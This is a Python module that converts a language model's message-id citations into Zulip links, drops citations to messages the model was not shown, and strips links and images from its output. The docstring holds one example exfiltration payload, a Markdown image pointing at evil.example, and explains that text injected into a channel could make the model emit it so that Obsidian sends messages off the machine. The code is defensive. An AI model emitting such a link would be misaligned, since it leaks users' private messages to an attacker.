"""Turning the model's [m123] citations into links back to Zulip.

The model never writes URLs. It cites message ids, and this code builds the
links from the messages it was actually shown. A cited id that wasn't in the
input is dropped, and a bullet left with no real source gets flagged, so a
made-up item can't pass as a sourced one.

Anything link-shaped the model writes anyway is removed by defang. Zulip text
is written by anyone in a watched channel, and Obsidian fetches a remote image
as soon as a page renders, so an injected "![](https://evil.example/?q=...)"
would carry other messages off the machine.
"""

from __future__ import annotations

import re
from urllib.parse import quote

from crier.zulip import Message

CITATION = re.compile(r"\[\s*(m\d+(?:\s*[,;]\s*m?\d+)*)\s*\]")
BULLET = re.compile(r"^\s*(?:[-*+]|\d+[.)])\s")
NO_SOURCE = " _(no source)_"

IMAGE = re.compile(r"!\[[^\]\n]*\]\([^)\n]*\)")
LINK = re.compile(r"\[([^\]\n]*)\]\([^)\n]*\)")
REF_DEF = re.compile(r"^ {0,3}\[[^\]\n]+\]:[ \t]*(?:<|//|[A-Za-z][A-Za-z0-9+.-]*://).*$", re.MULTILINE)
TAG = re.compile(r"</?[A-Za-z][^>\n]*>")  # HTML and <https://...> autolinks
URL = re.compile(r"\b[A-Za-z][A-Za-z0-9+.-]*://\S+")
LINK_GONE = "(link)"


def defang(text: str) -> str:
    """Model output with every image, link, HTML tag and URL taken out."""
    text = REF_DEF.sub("", text)
    text = IMAGE.sub("", text)
    text = LINK.sub(r"\1", text)
    text = TAG.sub("", text)
    return URL.sub(LINK_GONE, text)


def encode_hash(s: str) -> str:
    """Zulip's own encoding for narrow URLs: percent-encode, then % becomes '.'."""
    return quote(s, safe="").replace(".", "%2E").replace("%", ".")


def message_url(site: str, m: Message) -> str:
    return (
        f"{site}/#narrow/channel/{m.stream_id}-{encode_hash(m.stream)}"
        f"/topic/{encode_hash(m.topic)}/near/{m.id}"
    )


def cited_ids(line: str) -> list[int]:
    """Every message id a line cites, in order."""
    ids = []
    for match in CITATION.finditer(line):
        ids += [int(part.strip().lstrip("m")) for part in re.split(r"[,;]", match.group(1))]
    return ids


def link_citations(text: str, by_id: dict[int, Message], site: str) -> str:
    lines = []
    for line in defang(text).splitlines():
        sourced = False

        def replace(match: re.Match) -> str:
            nonlocal sourced
            ids = [int(part.strip().lstrip("m")) for part in re.split(r"[,;]", match.group(1))]
            links = [f"[↗]({message_url(site, by_id[i])})" for i in ids if i in by_id]
            sourced = sourced or bool(links)
            return " ".join(links)

        out = re.sub(r"[ \t]+$", "", CITATION.sub(replace, line))
        if BULLET.match(line) and not sourced:
            out += NO_SOURCE
        lines.append(out)
    return "\n".join(lines)
